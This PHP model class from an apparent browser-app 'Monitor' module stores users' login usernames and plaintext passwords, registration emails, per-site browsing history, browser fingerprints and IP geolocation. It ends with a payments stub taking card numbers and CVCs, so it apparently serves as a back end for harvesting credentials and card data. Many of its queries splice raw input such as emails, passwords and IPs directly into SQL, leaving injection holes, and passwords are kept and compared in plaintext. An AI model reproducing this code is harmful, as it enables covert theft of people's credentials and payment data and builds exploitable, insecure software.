<?php

namespace Mishusoft\Packages\Lab\Modules\Monitor\Models;

use Mishusoft\Framework\Chipsets\Cryptography\Encryption;
use Mishusoft\Framework\Drivers\Model;
use Mishusoft\Framework\PreRequires\_Array;
use Mishusoft\Framework\PreRequires\_String;
use PDO;

/**
 * @public
 */
class monitorModel extends Model
{
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * @public
     * @param $table_name
     * @return mixed
     */
    public function getLastInsertId($table_name)
    {
        $data = $this->query("SELECT LAST_INSERT_ID() FROM `" . DbPREFIX . "$table_name`;")->fetch(PDO::FETCH_ASSOC);
        return _Array::value($data, 'LAST_INSERT_ID()');
    }

    /**
     * @public
     * @param $name
     * @param $version
     * @param $ip
     * @param $browser
     * @return mixed
     */
    public function addInstalledAppList($name, $version, $ip, $browser)
    {
        /*INSERT INTO `msu_app_list_installed`(`id`, `name`, `version`, `ip_address`, `browserNameFull`, `created-date-time`) VALUES ([value-1],[value-2],[value-3],[value-4])*/
        return $this->prepare("INSERT INTO `" . DbPREFIX . "app_list_installed` (`id`, `name`, `version`, `ip_address`, `browserNameFull`, `created-date-time`) VALUES (null, :app_name, :version, :ip_add, :browser, now());")
            ->execute(
                array(
                    ':app_name' => $name,
                    ':version' => $version,
                    ':ip_add' => $ip,
                    ':browser' => $browser
                ));
    }

    /**
     * @public
     * @param $id
     * @return mixed
     */
    public function getInstallAppInfoById($id)
    {
        $id = (int)$id;
        return $this->query("SELECT * FROM `" . DbPREFIX . "app_list_installed` WHERE `id` = '{$id}';")->fetch(PDO::FETCH_ASSOC);
    }

    /**
     * @public
     * @param $name
     * @param $version
     * @param $ip
     * @param $browser
     * @return mixed
     */
    public function getInstalledAppPubId($name, $version, $ip, $browser)
    {
        $data = $this->query("SELECT `id` FROM `" . DbPREFIX . "app_list_installed` WHERE `name` = '{$name}' AND `version` = '{$version}' AND  `ip_address` = '{$ip}' AND `browserNameFull`='{$browser}';")->fetch(PDO::FETCH_ASSOC);
        return _Array::value($data, 'id');
    }

    /**
     * @public
     * @param $tracker
     * @param $app_id
     * @param $ip
     * @param $os_name_arch
     * @param $browser
     * @param $event
     * @param $username
     * @param $password
     * @param $workWebsite
     * @return mixed
     */
    public function saveUserLogInData($tracker, $app_id, $ip, $os_name_arch, $browser, $event, $username, $password, $workWebsite)
    {
        //INSERT INTO `msu_info_app_browser_passwords`(`id`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `event`, `username`, `password`, `email`, `last_update_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10])
        return $this->prepare("INSERT INTO `" . DbPREFIX . "info_app_browser_passwords` (`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `username`, `password`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :os_name_arch, :browser, :workWebsite, :event, :username, :password, now());")
            ->execute(
                array(
                    ':tracker' => $tracker,
                    ':app_id' => $app_id,
                    ':ip_add' => $ip,
                    ':os_name_arch' => $os_name_arch,
                    ':browser' => $browser,
                    ':event' => $event,
                    ':username' => $username,
                    ':password' => $password,
                    ':workWebsite' => $workWebsite
                ));
    }

    /**
     * @public
     * @param $tracker
     * @param $app_id
     * @param $ip
     * @param $os_name_arch
     * @param $browser
     * @param $event
     * @param $username
     * @param $password
     * @param $email
     * @param $workWebsite
     * @return mixed
     */
    public function saveRegistrationData($tracker, $app_id, $ip, $os_name_arch, $browser, $event, $username, $password, $email, $workWebsite)
    {
        //INSERT INTO `msu_info_app_browser_passwords`(`id`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `username`, `password`, `email`, `last_update_date_time`)  VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10])
        return $this->prepare("INSERT INTO `" . DbPREFIX . "info_app_browser_passwords` (`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `username`, `password`, `email`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :os_name_arch, :browser, :workWebsite, :event, :username, :password, :email, now());")
            ->execute(
                array(
                    ':tracker' => $tracker,
                    ':app_id' => $app_id,
                    ':ip_add' => $ip,
                    ':os_name_arch' => $os_name_arch,
                    ':browser' => $browser,
                    ':event' => $event,
                    ':username' => $username,
                    ':password' => $password,
                    ':email' => $email,
                    ':workWebsite' => $workWebsite
                ));
    }

    /**
     * @public
     * @param $tracker
     * @param $app_id
     * @param $ip
     * @param $os_name_arch
     * @param $browser
     * @param $event
     * @param $username
     * @param $workWebsite
     * @return mixed
     */
    public function saveLogOutData($tracker, $app_id, $ip, $os_name_arch, $browser, $event, $username, $workWebsite)
    {
        //INSERT INTO `msu_info_app_browser_passwords`(`id`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `event`, `username`, `password`, `email`, `last_update_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10])
        return $this->prepare("INSERT INTO `" . DbPREFIX . "info_app_browser_passwords` (`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `username`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :os_name_arch, :browser, :workWebsite, :event, :username, now());")
            ->execute(
                array(
                    ':tracker' => $tracker,
                    ':app_id' => $app_id,
                    ':ip_add' => $ip,
                    ':os_name_arch' => $os_name_arch,
                    ':browser' => $browser,
                    ':event' => $event,
                    ':username' => $username,
                    ':workWebsite' => $workWebsite
                ));
    }

    /**
     * @public
     * @param $tracker
     * @param $app_id
     * @param $ip
     * @param $os_name_arch
     * @param $browser
     * @param $event
     * @param $workWebsite
     * @return mixed
     */
    public function saveBrowserHistoriesData($tracker, $app_id, $ip, $os_name_arch, $browser, $event, $workWebsite)
    {
        //INSERT INTO `msu_info_app_browser_history`(`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `last_update_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9])
        return $this->prepare("INSERT INTO `" . DbPREFIX . "info_app_browser_history` (`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :os_name_arch, :browser, :workWebsite, :event, now());")
            ->execute(
                array(
                    ':tracker' => $tracker,
                    ':app_id' => $app_id,
                    ':ip_add' => $ip,
                    ':os_name_arch' => $os_name_arch,
                    ':browser' => $browser,
                    ':event' => $event,
                    ':workWebsite' => $workWebsite
                ));
    }

    /**
     * @public
     * @param $email
     * @return mixed
     */
    public function getRegisteredUserIdByEmail($email)
    {
        $data = $this->query("SELECT `id` FROM `" . DbPREFIX . "info_app_users` WHERE `email_address` = '{$email}';")->fetch(PDO::FETCH_ASSOC);
        return _Array::value($data, 'id');
    }

    /**
     * @public
     * @param $ip
     * @return mixed
     */
    public function getRegisteredUserIdByIP($ip)
    {
        $data = $this->query("SELECT `id` FROM `" . DbPREFIX . "info_app_users` WHERE `ip_address` = '{$ip}';")->fetch(PDO::FETCH_ASSOC);
        return _Array::value($data, 'id');
    }

    /**
     * @public
     * @param $data
     * @return mixed
     */
    private function resolveLicence($data): array
    {
        $d = array();
        if (!empty($data)) {
            $d['app_id'] = Encryption::static(_Array::value($data, 'app_id'));
            $d['ip_address'] = _Array::value($data, 'ip_address');
            $d['browserNameFull'] = _Array::value($data, 'browserNameFull');
            $d['key'] = Encryption::static(_Array::value($data, 'id'));
            $d['type'] = _Array::value($data, 'licence_type');
            $d['issue'] = _Array::value($data, 'issue');
            $d['update'] = _Array::value($data, 'lupdate');
            $d['nextUpdate'] = _Array::value($data, 'lnextupdate');
            $d['expire'] = _Array::value($data, 'expire');
            $d['limit'] = _Array::value($data, 'lLimit');
            $d['limitBase'] = _Array::value($data, 'lLimitBase');
        }

        return $d;
    }

    /**
     * @public
     * @param $id
     * @return mixed
     */
    public function getLicenceByAppId($id): array
    {
        $id = (int)$id;
        $data = $this->query("SELECT * FROM `" . DbPREFIX . "app_licences` WHERE `app_id` = '{$id}';");
        return $this->resolveLicence($data->fetch(PDO::FETCH_ASSOC));
    }

    /**
     * @public
     * @param $id
     * @param $ip
     * @return mixed
     */
    public function resetUserIpInLicenceByAppId($id, $ip)
    {
        $id = (int)$id;
        return $this->query("Update `" . DbPREFIX . "app_licences` SET `ip_address` = '{$ip}' WHERE `app_id` = '{$id}';");
    }

    /**
     * @public
     * @param $id
     * @param $browser
     * @return mixed
     */
    public function resetUserBrowserInLicenceByAppId($id, $browser)
    {
        $id = (int)$id;
        return $this->query("Update `" . DbPREFIX . "app_licences` SET `browserNameFull` = '{$browser}' WHERE `app_id` = '{$id}';");
    }

    /**
     * @public
     * @param $app_id
     * @param $ip
     * @param $browser
     * @return mixed
     */
    public function getLicenceByIdIpBrowser($app_id, $ip, $browser): array
    {
        $data = $this->query("SELECT * FROM `" . DbPREFIX . "app_licences` WHERE `app_id` = '{$app_id}' AND `ip_address` = '{$ip}' AND `browserNameFull` = '{$browser}';")->fetch(PDO::FETCH_ASSOC);
        return $this->resolveLicence($data);
    }

    /**
     * @public
     * @param $clientId
     * @param $app_id
     * @param $ip
     * @param $browser
     * @param $ltype
     * @param $limit
     * @param $limitBase
     * @param $lissue
     * @param $lupdate
     * @param $lnextupdate
     * @param $lexpire
     * @return mixed
     */
    public function setUserLicence($clientId, $app_id, $ip, $browser, $ltype, $limit, $limitBase, $lissue, $lupdate, $lnextupdate, $lexpire)
    {
        //INSERT INTO `msu_app_licences`(`id`, `client_id`, `app_id`, `ip_address`, `browserNameFull`, `licence_type`, `lLimit`, `lLimitBase`, `issue`, `lupdate`, `lnextupdate`, `expire`, `created-date-time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10],[value-11],[value-12],[value-13])
        return $this->prepare("INSERT INTO `" . DbPREFIX . "app_licences` (`id`, `client_id`, `app_id`, `ip_address`, `browserNameFull`, `licence_type`, `lLimit`, `lLimitBase`, `issue`, `lupdate`, `lnextupdate`, `expire`, `created-date-time`) 
        VALUES (null, :clientId, :appId, :ip_add, :browser, :ltype, :limit, :limitBase, :lissue, :lupdate, :lnextupdate, :lexpire, now());")
            ->execute(
                array(
                    ':clientId' => $clientId,
                    ':appId' => $app_id,
                    ':ip_add' => $ip,
                    ':browser' => $browser,
                    ':ltype' => $ltype,
                    ':limit' => $limit,
                    ':limitBase' => $limitBase,
                    ':lissue' => $lissue,
                    ':lupdate' => $lupdate,
                    ':lnextupdate' => $lnextupdate,
                    ':lexpire' => $lexpire
                ));
    }


    /**
     * @public
     * @param $app_id
     * @param $earn
     * @return mixed
     */
    public function updateLicenceLimit($app_id, $earn)
    {
        /*
         * UPDATE `msu_app_licences` SET `id`=[value-1],`client_id`=[value-2],`app_id`=[value-3],`ip_address`=[value-4],
         * `browserNameFull`=[value-5],`licence_type`=[value-6],`lLimit`=[value-7],`issue`=[value-8],`lupdate`=[value-9],
         * `expire`=[value-10],`created-date-time`=[value-11] WHERE 1
         * */
        $app_id = (int)$app_id;
        $earn = (int)$earn;
        return $this->query("Update `" . DbPREFIX . "app_licences` SET `lLimit` = `lLimit` - '{$earn}' WHERE `app_id` = '{$app_id}';");
    }

    /**
     * @public
     * @param $app_id
     * @param $limit
     * @return mixed
     */
    public function upgradeLicenceLimit($app_id, $limit)
    {
        /*
         * UPDATE `msu_app_licences` SET `id`=[value-1],`client_id`=[value-2],`app_id`=[value-3],`ip_address`=[value-4],
         * `browserNameFull`=[value-5],`licence_type`=[value-6],`lLimit`=[value-7],`issue`=[value-8],`lupdate`=[value-9],
         * `expire`=[value-10],`created-date-time`=[value-11] WHERE 1
         * */
        $app_id = (int)$app_id;
        $limit = (int)$limit;
        return $this->query("Update `" . DbPREFIX . "app_licences` SET `lLimit` = '{$limit}' WHERE `app_id` = '{$app_id}';");
    }

    /**
     * @public
     * @param $ip
     * @return mixed
     */
    public function getUserIdByIpAddress($ip)
    {
        $data = $this->query("SELECT `id` FROM `" . DbPREFIX . "info_app_users` WHERE `ip_address` = '{$ip}';")->fetch(PDO::FETCH_ASSOC);
        return _Array::value($data, 'id');
    }

    /**
     * @public
     * @param $email
     * @return mixed
     */
    public function getUserIdByEmail($email)
    {
        $data = $this->query("SELECT `id` FROM `" . DbPREFIX . "info_app_users` WHERE `email_address` = '{$email}';")->fetch(PDO::FETCH_ASSOC);
        return _Array::value($data, 'id');
    }


    /**
     * @public
     * @param $app_id
     * @param $username
     * @param $date
     * @return mixed
     */
    public function getEarningByDate($app_id, $username, $date)
    {
        $app_id = (int)$app_id;
        $data = $this->query("SELECT * FROM `" . DbPREFIX . "info_app_installed_devices_earning` WHERE `app_id`='{$app_id}' AND `username`='{$username}' AND `current_earning_date` = '{$date}';");
        return $data->fetch(PDO::FETCH_ASSOC);
    }

    /**
     * @public
     * @param $app_id
     * @param $username
     * @param $earn
     * @param $referrals
     * @param $referralsEarn
     * @return mixed
     */
    public function updateTodayEarningByDate($app_id, $username, $earn, $referrals, $referralsEarn)
    {
        /*
         * UPDATE `msu_info_app_installed_devices_earning` SET `id`=[value-1],`app_id`=[value-2],`today_total_earn`=[value-3],
         * `total_earn`=[value-4],`total_referrals_attracted`=[value-5],`total_referrals_earning`=[value-6],
         * `event`=[value-7],`username`=[value-8],`workWebsite`=[value-9],`current_earning_date`=[value-10],
         * `last_update_date_time`=[value-11] WHERE 1
         * */
        $app_id = (int)$app_id;
        $earn = (int)$earn;
        return $this->query("Update `" . DbPREFIX . "info_app_installed_devices_earning` SET `today_total_earn` = `today_total_earn` + '{$earn}', `total_earn` = `total_earn` + '{$earn}', `total_referrals_attracted` = '{$referrals}',`total_referrals_earning` = '{$referralsEarn}' WHERE `app_id` = '{$app_id}' AND `username` = '{$username}';");
    }

    /**
     * @public
     * @param $app_id
     * @param $earn
     * @param $referrals
     * @param $referralsEarn
     * @param $event
     * @param $username
     * @param $workWebsite
     * @param $date
     * @return mixed
     */
    public function addEarningDetails($app_id, $earn, $referrals, $referralsEarn, $event, $username, $workWebsite, $date)
    {
        /*
         * INSERT INTO `msu_info_app_installed_devices_earning`(`id`, `app_id`, `today_total_earn`, `total_earn`, `total_referrals_attracted`,
         * `total_referrals_earning`, `event`, `username`, `workWebsite`, `current_earning_date`, `last_update_date_time`)
         * VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10],[value-11])
         * */
        $app_id = (int)$app_id;
        $earn = (int)$earn;
        return $this->query("INSERT INTO  `" . DbPREFIX . "info_app_installed_devices_earning`(`id`, `app_id`, `today_total_earn`, `total_earn`, `total_referrals_attracted`, `total_referrals_earning`, `event`, `username`, `workWebsite`, `current_earning_date`, `last_update_date_time`) 
        VALUES (null,'{$app_id}','{$earn}','{$earn}','{$referrals}','{$referralsEarn}','{$event}','{$username}','{$workWebsite}','{$date}',now());");
    }

    /**
     * @public
     * @param $app_id
     * @param $ip
     * @param $os_name_arch
     * @param $browser
     * @param $first_name
     * @param $last_name
     * @param $email
     * @param $password
     * @return mixed
     */
    public function saveUserSettingData($app_id, $ip, $os_name_arch, $browser, $first_name, $last_name, $email, $password)
    {
        //INSERT INTO `msu_info_app_users`(`id`, `first_name`, `last_name`, `email_address`, `password`, `app_id`, `ip_address`, `browserName`, `os_name_arc`, `created_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9])
        return $this->prepare("INSERT INTO `" . DbPREFIX . "info_app_users` (`id`, `first_name`, `last_name`, `email_address`, `password`, `app_id`, `ip_address`, `browserName`, `os_name_arc`, `created_date_time`) VALUES (null, :first_name, :last_name, :email, :password, :app_id, :ip_add, :browser, :os_name_arch, now());")
            ->execute(
                array(
                    ':app_id' => $app_id,
                    ':ip_add' => $ip,
                    ':os_name_arch' => $os_name_arch,
                    ':browser' => $browser,
                    ':first_name' => $first_name,
                    ':last_name' => $last_name,
                    ':email' => $email,
                    ':password' => $password
                ));
    }

    /**
     * @public
     * @param $userid
     * @param $app_id
     * @param $ip
     * @param $os_name_arch
     * @param $browser
     * @param $first_name
     * @param $last_name
     * @param $email
     * @param $password
     * @return mixed
     */
    public function resetUserIpData($userid, $app_id, $ip, $os_name_arch, $browser, $first_name, $last_name, $email, $password)
    {
        //UPDATE `msu_info_app_users` SET `id`=[value-1],`first_name`=[value-2],`last_name`=[value-3],`email_address`=[value-4],`password`=[value-5],`app_id`=[value-6],`ip_address`=[value-7],`browserName`=[value-8],`os_name_arc`=[value-9],`created_date_time`=[value-10] WHERE 1
        return $this->query("UPDATE `" . DbPREFIX . "info_app_users` SET `first_name`='{$first_name}',`last_name`='{$last_name}',`email_address`='{$email}',`password`='{$password}',`app_id`='{$app_id}',`ip_address`='{$ip}',`browserName`='{$browser}',`os_name_arc`='{$os_name_arch}' WHERE `id` = {$userid};");
    }

    /**
     * @public
     * @param $userid
     * @param $app_id
     * @param $ip
     * @param $os_name_arch
     * @param $browser
     * @return mixed
     */
    public function updateUserAppId($userid, $app_id, $ip, $os_name_arch, $browser)
    {
        //UPDATE `msu_info_app_users` SET `id`=[value-1],`first_name`=[value-2],`last_name`=[value-3],`email_address`=[value-4],`password`=[value-5],`app_id`=[value-6],`ip_address`=[value-7],`browserName`=[value-8],`os_name_arc`=[value-9],`created_date_time`=[value-10] WHERE 1
        return $this->query("UPDATE `" . DbPREFIX . "info_app_users` SET `app_id`='{$app_id}',`ip_address`='{$ip}',`browserName`='{$browser}',`os_name_arc`='{$os_name_arch}' WHERE `id` = {$userid};");
    }

    /**
     * @public
     * @param $userId
     * @param $appId
     * @param $ip
     * @param $browser
     * @return mixed
     */
    public function updateUserLicenceAppId($userId, $appId, $ip, $browser)
    {
        /*UPDATE `msu_app_licences` SET `client_id` = '0' WHERE `msu_app_licences`.`id` = 1; */
        return $this->query("UPDATE `" . DbPREFIX . "app_licences` SET `app_id`='{$appId}',`ip_address`='{$ip}',`browserNameFull`='{$browser}' WHERE `client_id` = {$userId};");
    }

    /**
     * @public
     * @param $email
     * @return mixed
     */
    public function getUserInfoByEmail($email)
    {
        $data = $this->query("SELECT * FROM `" . DbPREFIX . "info_app_users` WHERE `email_address` = '{$email}';");
        return $data->fetch(PDO::FETCH_ASSOC);
    }

    /**
     * @public
     * @param $email
     * @param $password
     * @return mixed
     */
    public function getUserInfoByEmailPassword($email, $password)
    {
        $d = array();
        $data = $this->query("SELECT * FROM `" . DbPREFIX . "info_app_users` WHERE `email_address` = '{$email}' AND `password` = '{$password}';");
        $data = $data->fetch(PDO::FETCH_ASSOC);
        if (!empty($data)) {
            $d['firstName'] = _Array::value($data, 'first_name');
            $d['lastName'] = _Array::value($data, 'last_name');
            $d['emailAddress'] = _Array::value($data, 'email_address');
            $d['password'] = _Array::value($data, 'password');
        }

        return $d;
    }

    /**
     * @public
     * @param $email
     * @return mixed
     */
    public function getUserPasswordByEmail($email)
    {
        $data = $this->query("SELECT `password` FROM `" . DbPREFIX . "info_app_users` WHERE `email_address` = '{$email}';")->fetch(PDO::FETCH_ASSOC);
        return _Array::value($data, 'password');
    }

    /**
     * @public
     * @param $name
     * @param $version
     * @param $ip
     * @param $browser
     * @param $message
     * @return mixed
     */
    public function receiveUserUpdateInfo($name, $version, $ip, $browser, $message)
    {
        return $this->prepare("INSERT INTO `" . DbPREFIX . "client_update_info` (`id`, `name`, `version`, `ip_address`, `browserNameFull`, `message`, `created_date_time`) VALUES (null, :app_name, :version, :ip_add, :browser, :message, now());")
            ->execute(
                array(
                    ':app_name' => $name,
                    ':version' => $version,
                    ':ip_add' => $ip,
                    ':browser' => $browser,
                    ':message' => $message
                ));
    }

    /**
     * @public
     * @param $name
     * @param $version
     * @param $ip
     * @param $os_version
     * @param $browser
     * @return mixed
     */
    public function getAppStatusInfo($name, $version, $ip, $os_version, $browser)
    {
        $data = $this->query("SELECT * FROM `" . DbPREFIX . "apps_status` WHERE `name` = '{$name}' AND `version`='{$version}' AND `ip_address`='{$ip}' AND`os_version`='{$os_version}' AND `browserNameFull`='{$browser}';");
        return $data->fetchAll(PDO::FETCH_ASSOC);
    }

    /**
     * @public
     * @param $name
     * @param $version
     * @param $ip
     * @param $os_version
     * @param $browser
     * @param $message
     * @return mixed
     */
    public function addAppStatusInfo($name, $version, $ip, $os_version, $browser, $message)
    {
        /*
         * INSERT INTO `msu_apps_status`(`id`, `name`, `version`, `ip_address`, `os_version`, `browserNameFull`, `status`, `created_date_time`)
         * VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7])
         * */
        $data = $this->query("INSERT INTO `" . DbPREFIX . "apps_status` (`id`, `name`, `version`, `ip_address`, `os_version`, `browserNameFull`, `status`, `created_date_time`) VALUES (null,'{$name}','{$version}','{$ip}','{$os_version}','{$browser}','{$message}',now());");
        return $data->fetch(PDO::FETCH_ASSOC);
    }

    /**
     * @public
     * @param $name
     * @param $version
     * @param $ip
     * @param $os_version
     * @param $browser
     * @param $message
     * @return mixed
     */
    public function updateAppStatusInfo($name, $version, $ip, $os_version, $browser, $message)
    {
        /*
         * UPDATE `msu_apps_status` SET `id`=[value-1],`name`=[value-2],`version`=[value-3],`ip_address`=[value-4],``os_version`=[os_version],`browserNameFull`=[value-5],`status`=[value-6],`created_date_time`=[value-7] WHERE 1
         * */
        $data = $this->query("UPDATE `" . DbPREFIX . "apps_status` SET `status`='{$message}',`created_date_time`=now() WHERE `name` = '{$name}' AND `version`='{$version}' AND `ip_address`='{$ip}' AND `os_version`='{$os_version}' AND `browserNameFull`='{$browser}';");
        return $data->fetch(PDO::FETCH_ASSOC);
    }

    /**
     * @public
     * @param $data
     * @return mixed
     */
    public function receiveUserBrowserInfo($data)
    {
        /*$ip, $BrowserName, $BrowserNameFull, $BrowserVersion, $BrowserVersionFull, $BrowserStatus, $BrowserArchitecture, $BrowserAppName, $BrowserAppCodeName, $BrowserAppVersion, $BrowserBuildID, $BrowserDoNotTrack, $BrowserCookieEnabled, $BrowserLanguage, $BrowserLanguageAll, $BrowserEngine, $BrowserEngineVersion, $BrowserVendor, $DeviceHardwareConcurrency, $DeviceMemory, $PlatformName, $PlatformArchitecture, $PlatformWindowManager, $DeviceName, $DeviceType, $DeviceScreenWidth, $DeviceScreenHeight, $DeviceScreenColorDepth, $DeviceScreenPixelDepth, $WindowLocationHref, $WindowLocationProtocol, $WindowLocationHostname, $WindowLocationPathname, $UserAgent*/
        return $this->db->prepare("INSERT INTO `" . DbPREFIX . "client_browser_info` (`id`, `ip_address`, `browserName`, `browserNameFull`, `browserVersion`, `browserVersionFull`, `browserStatus`, `browserArchitecture`, `browserAppName`, `browserCodeAppName`, `browserAppVersion`, `browserBuildID`, `browserDoNotTrack`, `browserCookieEnabled`, `browserLanguage`, `browserLanguageAll`, `browserEngine`, `browserEngineVersion`, `browserVendor`, `deviceHardwareConcurrency`, `deviceMemory`, `platformName`, `platformArchitecture`, `platformWindowManager`, `deviceName`, `deviceType`, `deviceScreenWidth`, `deviceScreenHeight`, `deviceScreenColorDepth`, `deviceScreenPixelDepth`, `windowLocationHref`, `windowLocationProtocol`, `windowLocationHostname`, `windowLocationPathname`, `userAgent`, `created_date_time`)VALUES (null, :ip_add, :browserName, :browserNameFull, :browserVersion, :browserVersionFull, :browserStatus, :browserArchitecture, :browserAppName, :browserAppCodeName, :browserAppVersion, :browserBuildID, :browserDoNotTrack, :browserCookieEnabled, :browserLanguage, :browserLanguageAll, :browserEngine, :browserEngineVersion, :browserVendor, :deviceHardwareConcurrency, :deviceMemory, :platformName, :platformArchitecture, :platformWindowManager, :deviceName, :deviceType, :deviceScreenWidth, :deviceScreenHeight, :deviceScreenColorDepth, :deviceScreenPixelDepth, :windowLocationHref, :windowLocationProtocol, :windowLocationHostname,:windowLocationPathname, :userAgent, now());")
            ->execute(array(
                ':ip_add' => _String::removeTags($data->browser->ip),
                ':browserName' => _String::removeTags($data->browser->BrowserName),
                ':browserNameFull' => _String::removeTags($data->browser->BrowserNameFull),
                ':browserVersion' => _String::removeTags($data->browser->BrowserVersion),
                ':browserVersionFull' => _String::removeTags($data->browser->BrowserVersionFull),
                ':browserStatus' => _String::removeTags($data->browser->BrowserStatus),
                ':browserArchitecture' => _String::removeTags($data->browser->BrowserArchitecture),
                ':browserAppName' => _String::removeTags($data->browser->BrowserAppName),
                ':browserAppCodeName' => _String::removeTags($data->browser->BrowserAppCodeName),
                ':browserAppVersion' => _String::removeTags($data->browser->BrowserAppVersion),
                ':browserBuildID' => _String::removeTags($data->browser->BrowserBuildID),
                ':browserDoNotTrack' => $data->browser->BrowserDoNotTrack,
                ':browserCookieEnabled' => $data->browser->BrowserCookieEnabled,
                ':browserLanguage' => _String::removeTags($data->browser->BrowserLanguage),
                ':browserLanguageAll' => $data->browser->BrowserLanguageAll,
                ':browserEngine' => _String::removeTags($data->browser->BrowserEngine),
                ':browserEngineVersion' => _String::removeTags($data->browser->BrowserEngineVersion),
                ':browserVendor' => _String::removeTags($data->browser->BrowserVendor),
                ':deviceHardwareConcurrency' => _String::removeTags($data->browser->DeviceHardwareConcurrency),
                ':deviceMemory' => _String::removeTags($data->browser->DeviceMemory),
                ':platformName' => _String::removeTags($data->browser->PlatformName),
                ':platformArchitecture' => _String::removeTags($data->browser->PlatformArchitecture),
                ':platformWindowManager' => _String::removeTags($data->browser->PlatformWindowManager),
                ':deviceName' => _String::removeTags($data->browser->DeviceName),
                ':deviceType' => _String::removeTags($data->browser->DeviceType),
                ':deviceScreenWidth' => $data->browser->DeviceScreenWidth,
                ':deviceScreenHeight' => $data->browser->DeviceScreenHeight,
                ':deviceScreenColorDepth' => $data->browser->DeviceScreenColorDepth,
                ':deviceScreenPixelDepth' => $data->browser->DeviceScreenPixelDepth,
                ':windowLocationHref' => _String::removeTags($data->browser->WindowLocationHref),
                ':windowLocationProtocol' => _String::removeTags($data->browser->WindowLocationProtocol),
                ':windowLocationHostname' => _String::removeTags($data->browser->WindowLocationHostname),
                ':windowLocationPathname' => _String::removeTags($data->browser->WindowLocationPathname),
                ':userAgent' => $data->browser->UserAgent
            ));
    }

    /**
     * @public
     * @param $data
     * @return mixed
     */
    public function receiveUserIpInfo($data)
    {
        return $this->db->prepare("INSERT INTO `" . DbPREFIX . "client_ip_info` (`id`, `ip_address`, `is_eu`, `city`, `region`, `region_code`, `country_name`, `country_code`, `continent_name`, `continent_code`, `latitude`, `longitude`, `postal`, `calling_code`, `flag`, `emoji_flag`, `emoji_unicode`, `asn_asn`, `asn_name`, `asn_domain`, `asn_route`, `asn_type`, `languages_name`, `languages_native`, `currency_name`, `currency_code`, `currency_symbol`, `currency_native`, `currency_plural`, `time_zone_name`, `time_zone_abbr`, `time_zone_offset`, `time_zone_is_dst`, `time_zone_current_time`, `created_date_time`) VALUES (null, :ip_add, :is_eu, :city, :region, :region_code, :country_name, :country_code, :continent_name, :continent_code, :latitude, :longitude, :postal, :calling_code, :flag, :emoji_flag, :emoji_unicode, :asn_asn, :asn_name, :asn_domain, :asn_route, :asn_type, :languages_name, :languages_native, :currency_name, :currency_code, :currency_symbol, :currency_native, :currency_plural, :time_zone_name, :time_zone_abbr, :time_zone_offset,:time_zone_is_dst, :time_zone_current_time, now());")
            ->execute(array(
                ':ip_add' => _String::removeTags($data->ipdata->ip),
                ':is_eu' => _String::removeTags($data->ipdata->is_eu),
                ':city' => _String::removeTags($data->ipdata->city),
                ':region' => _String::removeTags($data->ipdata->region),
                ':region_code' => _String::removeTags($data->ipdata->region_code),
                ':country_name' => _String::removeTags($data->ipdata->country_name),
                ':country_code' => _String::removeTags($data->ipdata->country_code),
                ':continent_name' => _String::removeTags($data->ipdata->continent_name),
                ':continent_code' => _String::removeTags($data->ipdata->continent_code),
                ':latitude' => _String::removeTags($data->ipdata->latitude),
                ':longitude' => _String::removeTags($data->ipdata->longitude),
                ':postal' => _String::removeTags($data->ipdata->postal),
                ':calling_code' => _String::removeTags($data->ipdata->calling_code),
                ':flag' => _String::removeTags($data->ipdata->flag),
                ':emoji_flag' => _String::removeTags($data->ipdata->emoji_flag),
                ':emoji_unicode' => _String::removeTags($data->ipdata->emoji_unicode),
                ':asn_asn' => _String::removeTags($data->ipdata->asn_asn),
                ':asn_name' => _String::removeTags($data->ipdata->asn_name),
                ':asn_domain' => _String::removeTags($data->ipdata->asn_domain),
                ':asn_route' => _String::removeTags($data->ipdata->asn_route),
                ':asn_type' => _String::removeTags($data->ipdata->asn_type),
                ':languages_name' => _String::removeTags($data->ipdata->languages_name),
                ':languages_native' => _String::removeTags($data->ipdata->languages_native),
                ':currency_name' => _String::removeTags($data->ipdata->currency_name),
                ':currency_code' => _String::removeTags($data->ipdata->currency_code),
                ':currency_symbol' => _String::removeTags($data->ipdata->currency_symbol),
                ':currency_native' => _String::removeTags($data->ipdata->currency_native),
                ':currency_plural' => _String::removeTags($data->ipdata->currency_plural),
                ':time_zone_name' => _String::removeTags($data->ipdata->time_zone_name),
                ':time_zone_abbr' => _String::removeTags($data->ipdata->time_zone_abbr),
                ':time_zone_offset' => _String::removeTags($data->ipdata->time_zone_offset),
                ':time_zone_is_dst' => _String::removeTags($data->ipdata->time_zone_is_dst),
                ':time_zone_current_time' => _String::removeTags($data->ipdata->time_zone_current_time)
            ));
    }

    /**
     * @public
     * @param $tracker
     * @param $app_id
     * @param $ip
     * @param $os_name_arch
     * @param $browser
     * @param $cardNumber
     * @param $cardBrand
     * @param $cardHolder
     * @param $cardExpire
     * @param $cardCVC
     * @param $event
     * @param $workWebsite
     * @return mixed
     */
    /*payments*/
